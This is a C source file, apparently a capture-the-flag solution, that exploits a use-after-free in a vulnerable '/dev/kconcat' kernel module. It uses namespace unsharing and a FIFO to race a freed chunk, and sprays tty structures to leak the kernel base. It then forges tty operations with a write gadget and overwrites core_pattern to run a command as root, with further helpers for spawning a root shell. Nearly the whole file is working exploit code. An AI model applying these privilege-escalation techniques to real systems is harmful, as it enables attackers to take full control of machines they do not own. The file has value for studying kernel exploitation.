#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/timerfd.h>
#include <signal.h>
#include <sys/mman.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <errno.h>
#include <stdbool.h>
#include <stddef.h>
#include <sys/msg.h>
#include <limits.h>
#include <stdarg.h>
#include <sys/xattr.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/stat.h>

#define DEV_PATH "/dev/kconcat"   // the path the device is placed

#define ulong unsigned long
#define PAGE_SZ 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
#define ARRAY_SIZE(a) (sizeof((a)) / sizeof((a)[0]))
#define HEAP_MASK 0xffff000000000000
#define KERNEL_MASK 0xffffffff00000000

#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }
#define MAX_KEYS 199

typedef struct {
    int read;
    int write;
} pipe_t;

int seq_ops[0x10000];
int ptmx[0x1000];
int keys[0x1000];
pthread_t poll_tid[0x1000];
int pipes[0x1000][0x02];
int fds[0x1000];
int n_keys;

struct poll_list {
	struct poll_list *next;
	int len;
	struct pollfd entries[];
};

struct rcu_head {
    void *next;
    void *func;
};

struct user_key_payload {
    struct rcu_head rcu;
    unsigned short datalen;
    char *data[];
};

static void print_hex8(void* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%d: %p ", i, tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static uint64_t bswap(uint64_t val)
{
    __asm__(
            ".intel_syntax noprefix;"
            "bswap rdi;"
            "mov rax, rdi;"
            ".att_syntax;"
    );
}

void info(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[+] ");
    vprintf(format, args);

    va_end(args);
}

void error(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[x] ");
    vprintf(format, args);

    va_end(args);
}

static void shell_modprobe()
{
    system("echo '#!/bin/sh' > /tmp/x; \
            echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/y");
    system("chmod +x /tmp/y");
    system("/tmp/y");
}

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

uint64_t user_cs,user_ss,user_sp,user_rflags;
static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

static int randint(int min, int max)
{
    return min + (rand() % (max - min));
}

static int create_timer(int leak)
{
  struct itimerspec its;

  its.it_interval.tv_sec = 0;
  its.it_interval.tv_nsec = 0;
  its.it_value.tv_sec = 2;
  its.it_value.tv_nsec = 0;

  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  timerfd_settime(tfd, 0, &its, 0);

  if (leak)
  {
    close(tfd);
    sleep(1);
    return 0;
  }
}

static void get_shell()
{
    if (!getuid())
	{
		puts("Got r00t :)");
        setuid(0);
        char *args[] = { "/bin/sh", "-i", NULL };
        execve(args[0], args, NULL);
	}
	exit(0);
}

static int userfaultfd(int flags)
{
    return syscall(SYS_userfaultfd, flags);
}

static bool is_kernel_ptr(uint64_t val)
{
    return (val & KERNEL_MASK) == KERNEL_MASK
        && val != 0xffffffffffffffff;
}

static bool is_heap_ptr(uint64_t val)
{
    return (val & HEAP_MASK) == HEAP_MASK
        && val != 0xffffffffffffffff;
}

void assign_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0)
    {
        errExit("[X] sched_setaffinity()");
    }
}

void assign_thread_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0)
    {
        errExit("[X] assign_thread_to_core_range()");
    }
}

void init_fd(int i)
{
    fds[i] = open("/etc/passwd", O_RDONLY);

    if (fds[i] < 1)
    {
        errExit("[X] init_fd()");
    }
}

static void alloc_seq_ops(int i) {
    seq_ops[i] = open("/proc/self/stat", O_RDONLY);

    if (seq_ops[i] < 0) {
        errExit("[X] spray_seq_ops()");
    }
}

static void free_seq_ops(int i) {
    if (close(seq_ops[i]) < 0) {
        errExit("[X] free seq_ops");
    }
}

static void alloc_tty(int i) {
    ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    if (ptmx[i] < 0) {
        errExit("[X] alloc_tty");
    }
}

static void free_tty(int i) {
    if (close(ptmx[i]) < 0) {
        errExit("[X] free tty");
    }
}

void alloc_pipe_buf(int i)
{
    if (pipe(pipes[i]) < 0) {
        perror("[X] alloc_pipe_buff()");
        return;
    }

    if (write(pipes[i][1], "XXXXX", 5) < 0) {
        perror("[X] alloc_pipe_buff()");
        return;
    }
}

void release_pipe_buf(int i)
{
    if (close(pipes[i][0]) < 0) {
        errExit("[X] release_pipe_buf");
    }

    if (close(pipes[i][1]) < 0) {
        errExit("[X] release_pipe_buf");
    }
}

typedef struct {
    int fd_read;
    unsigned amt;
    unsigned timeout;
    bool suspend;
} thread_args_t;

static unsigned corrupted_key;
#define POLL_LIST_SZ 0x10
#define POLL_FD_SZ 0x8
#define MAX_POLL_LIST_FDS 510
#define POLLFD_PER_PAGE  ((PAGE_SZ-sizeof(struct poll_list)) / sizeof(struct pollfd))
#define STACK_PPS_SZ 0x100

/*
 * Calc amount of fds we need to alloc to trigger allocation of a specific
 * kmalloc chunk
 */
static unsigned fds_to_alloc(size_t sz)
{
    // stuff allocated on stack (inside stack_pps buf)
    unsigned to_alloc = (STACK_PPS_SZ - sizeof(struct poll_list)) / sizeof(struct pollfd);

    // subtract size needed for poll_list struct
    if (sz % PAGE_SZ == 0) {
        sz -= sz / PAGE_SZ * sizeof(struct poll_list);
    }
    else {
        sz -= (sz / PAGE_SZ + 1) * sizeof(struct poll_list);
    }

    to_alloc += sz / sizeof(struct pollfd);

    return to_alloc;
}

static int poll_threads;
static pthread_mutex_t poll_mutex = PTHREAD_MUTEX_INITIALIZER;

/*
 * Note: In the exploit I use the assign_to_core() function to assign the 
 * process to another core before creating poll threads. This is useful to 
 * reduce noise due to thread creation on core 0 slabs. Once a thread has 
 * been created, it is assigned back to core-0 right before the poll() 
 * call using assign_thread_to_core(), a pthread_attr_setaffinity_np() wrapper.
 */
static void* spray_poll_list(void* args)
{
    thread_args_t *ta = (thread_args_t *)args;
    int ret;

    struct pollfd *pollers = calloc(ta->amt, sizeof(struct pollfd));

    for (int i = 0; i < ta->amt; i++) {
        pollers[i].fd = ta->fd_read;
        pollers[i].events = POLLERR;
    }

    assign_thread_to_core(0x0);

    pthread_mutex_lock(&poll_mutex);
    poll_threads++;
    pthread_mutex_unlock(&poll_mutex);

    ret = poll(pollers, ta->amt, ta->timeout);
    if (ret < 0) {
        errExit("poll");
    }

    assign_thread_to_core(randint(0x1, 0x3));
    
    if (ta->suspend) {
        pthread_mutex_lock(&poll_mutex);
        poll_threads--;
        pthread_mutex_unlock(&poll_mutex);

        while (1) { };
    }

    return NULL;
}

static void create_poll_thread(int i, thread_args_t *args)
{
    int ret;
    
    ret = pthread_create(&poll_tid[i], 0, spray_poll_list, (void *)args);
    if (ret != 0) {
        errExit("pthread_create");
    }
}

static void join_poll_threads(void)
{
    int ret;
    for (int i = 0; i < poll_threads; i++) {
        ret = pthread_join(poll_tid[i], NULL);
        
        if (ret < 0) {
            errExit("pthread_join");
        }
        open("/proc/self/stat", O_RDONLY);
    }
    poll_threads = 0x0;
}

#define ADD_TEMPLATE 0x1234
#define RM_TEMPLATE 0x1337

static void add_template(int fd, char* data)
{
    if (ioctl(fd, ADD_TEMPLATE, data) < 0) {
        errExit("ioctl");
    }
}

static void rm_template(int fd, char* data)
{
    if (ioctl(fd, RM_TEMPLATE, data) < 0) {
        errExit("ioctl");
    }
}

/**
 * void *kmalloc_trace(struct kmem_cache *s, gfp_t gfpflags, size_t size)
 *
 * module allocates 0x88 sized struct and stores ptr at file_p + 200
 *  - weird size. puts it just into kmalloc-256
 * 
 * fds = ptr to chuk
 * fds[0] = ptr to chunk (ptr to itself ?)
 * fds[1] = ptr to fds in bss
 *
 * fds+34 = fd_cnt
 * fds +38 .. = chunk_ptrs
 *
 * can write 0x200 bytes normally into chunk via write 
 *
 * +0x10 is a mutex
 *
 * first byte of fd is indicating if it was added via ioctl or write
 *  only when ioctl it tries to open file and read
 *
 *
 *  while (((&_ctype)[*path_check?] & 3) != 0);
 *      checks if letter or number
 *
 *
 * https://sysprog21.github.io/lkmpg/
 */

static void get_cap_sys_admin(int fd) 
{
    int ret;
    pid_t pid = fork();
    if (pid < 0) {
        errExit("fork");
    }
    if (pid == 0) {
        dup2(fd, 1);
        close(fd);
        execve("/usr/bin/mount", NULL, NULL);
        puts("[-] child: failed to run mount");
        exit(-1);
    }

    waitpid(pid, NULL, 0);
    char buf[0x1000] = {0};
    // read data mount wrote into device
    read(fd, buf, sizeof(buf));
}

static void do_unshare(char* name, int fd)
{
    char buf[0x80] = {0};
    sprintf(buf, "unshare -Urm %s %d", name, fd);
    if (system(buf) < 0) {
        errExit("system");
    }
}

static void do_mount()
{
    int ret;
    ret = mount("dummy", "/etc/kconcat/message-templates", "tmpfs", 0, "");

    if (ret < 0) {
        errExit("mount");
    }
}

uint64_t leak;
uint64_t leak_off;
static void* reader_func(void *arg)
{
    puts("[+] reader thread enter");
    int ret;
    int fd = *(int *)arg;
    char buf[0x1000] = {0};

    ret = read(fd, buf, 0x1000);
    if (ret < 0) {
        errExit("read");
    }
    
    leak = *(uint64_t*)(buf + leak_off);

    //print_hex8(buf, 0x100);
}

static uint64_t leak_base(int fd, int fifo_fd)
{
    int fd2 = open(DEV_PATH, O_RDWR);
    if (fd2 < 0) {
        errExit("fd2");
    }

    add_template(fd2, "hax");

    pthread_t reader;
    if (pthread_create(&reader, NULL, reader_func, &fd2) < 0) {
        errExit("pthread");
    }

    sleep(1);
    
    // free template causing the blocking reader thread to read from a freed 
    // template chunk
    rm_template(fd, "hax");

    for (int i = 0; i < 0x8; i++) {
        alloc_tty(i);
    }

    // ops ptr
    leak_off = 20;

    char buf[0x100] = {0};
    memset(buf, 0x41, leak_off);
    write(fifo_fd, buf, leak_off);

    pthread_join(reader, NULL);

    uint64_t k_base = leak - 0x1280c80;

    return k_base;
}

static uint64_t spray_fake_tty_ops(int fd, int fifo_fd, uint64_t k_base)
{
    int fd2 = open(DEV_PATH, O_RDWR);
    if (fd2 < 0) {
        errExit("fd2");
    }

    add_template(fd2, "hax");

    pthread_t reader;
    if (pthread_create(&reader, NULL, reader_func, &fd2) < 0) {
        errExit("pthread");
    }

    sleep(1);

    // 0xffffffff812639ef : mov dword ptr [rdx], ecx ; jmp 0xffffffff8126379b

    // free template causing the blocking reader thread to read from a freed 
    // template chunk
    rm_template(fd, "hax");

    for (int i = 8; i < 0x10; i++) {
        alloc_tty(i);
    }

    // mov dword ptr[rdx], ecx
    uint64_t gadget = k_base + 0x5f308;

    printf("[+] aaw gadget: %p \n", gadget);

    // ops ptr
    leak_off = 60;

    char buf[0x100] = {0};
    // align ptr due to +4 offset of buffer (first 4 bytes is the is_file bool)
    uint64_t *p_buf = (uint64_t*)(buf + 4);
    memset(buf, 0x41, leak_off);

    p_buf[0] = gadget;

    write(fifo_fd, buf, leak_off);

    pthread_join(reader, NULL);

    //printf("Leak?: %p \n", leak);
    
    uint64_t tty_base = leak -56;

    // ioctl ptr is at offset 12 of tty_ops
    // +8 because i cant write to +0 due to +4 stuff
    uint64_t ops_addr = (tty_base + 8) - 12 * 8;

    printf("[+] tty base: %p \n", tty_base);

    return ops_addr;
}

static void corrupt_ops_ptr(int fd, int fifo_fd, uint64_t ops_addr) 
{
    int fd2 = open(DEV_PATH, O_RDWR);
    if (fd2 < 0) {
        errExit("fd2");
    }

    add_template(fd2, "hax");

    pthread_t reader;
    if (pthread_create(&reader, NULL, reader_func, &fd2) < 0) {
        errExit("pthread");
    }

    sleep(1);

    // free template causing the blocking reader thread to read from a freed 
    // template chunk
    rm_template(fd, "hax");

    for (int i = 0x10; i < 0x18; i++) {
        alloc_tty(i);
    }

    char buf[0x100] = {0};
    memset(buf, 0x4, 0x41);
    uint64_t* p_buf = (uint64_t*)(buf + 4);
    p_buf[0] = ops_addr; // dev
    p_buf[1] = ops_addr; // driver
    p_buf[2] = ops_addr; // ops
    
    write(fifo_fd, buf, 28);

    pthread_join(reader, NULL);

}

int main2(int fd) 
{
    int ret;
    assign_to_core(0x0);

    do_mount();

    puts("[+] mounted message-templates");

    ret = mkfifo("/etc/kconcat/message-templates/hax", 0666);
    if (ret < 0) {
        errExit("mkfifo");
    }

    int fifo_fd = open("/etc/kconcat/message-templates/hax", O_RDWR);
    if (fifo_fd < 0) {
        errExit("open fifo_fd");
    }

    puts("[+] fifo created");

    uint64_t k_base = leak_base(fd, fifo_fd);
    printf("[+] Kbase: %p \n", k_base);

    uint64_t ops_addr = spray_fake_tty_ops(fd, fifo_fd, k_base);
    printf("[+] ops addr: %p \n", ops_addr);

    corrupt_ops_ptr(fd, fifo_fd, ops_addr);
    //corrupt_ops_ptr(fd, fifo_fd, 0x41414141);
    printf("[+] corrupted ops ptr \n");

    uint64_t core_pattern = k_base + 0x196bfe0;
    printf("[+] core pattern: %p \n", core_pattern);

    char corrupt[0x20] = {"|/usr/bin/chmod 0666 /flag"};
    uint32_t* p_corrupt = (uint32_t*)corrupt;

    for (int i = 0x10; i < 0x18; i++) {
        for (int j = 0; j < (sizeof(corrupt)/4); j++) {
            ioctl(ptmx[i], p_corrupt[j], core_pattern+(4*j));
        }
    }

    puts("[+] core_pattern corrupted");

    pid_t pid = fork();
    if (pid == 0x0) {
        *(int*)0 = 0;
    }
    sleep(1);

    system("cat /flag");

    puts("end");

    WAIT();
}

int main(int argc, char** argv) 
{
    if (getuid() != 0x0) {
        int fd = open(DEV_PATH, O_RDWR);

        if (fd < 0) {
            errExit("open");
        }

        get_cap_sys_admin(fd);
        puts("[+] got cap_sys_admin");

        printf("[+] unsharing namespace. Uid: %d \n", getuid());
        do_unshare(argv[0], fd);
    }
    else {
        if (argc < 2) {
            errExit("missing fd number");
        }
        int fd = atoi(argv[1]);
        if (fd == 0x0) {
            errExit("failed to convert fd");
        }
        printf("[+] running in new namespace: Uid: %d \n", getuid());
        main2(fd);
    }

    return 0;
}

// 0x204 => kmalloc 1024

// mov\s+(.*),\s*rax ; (:*)ret
// mov qword ptr [rsp\s+(.*),\s*rax ; (:*)ret
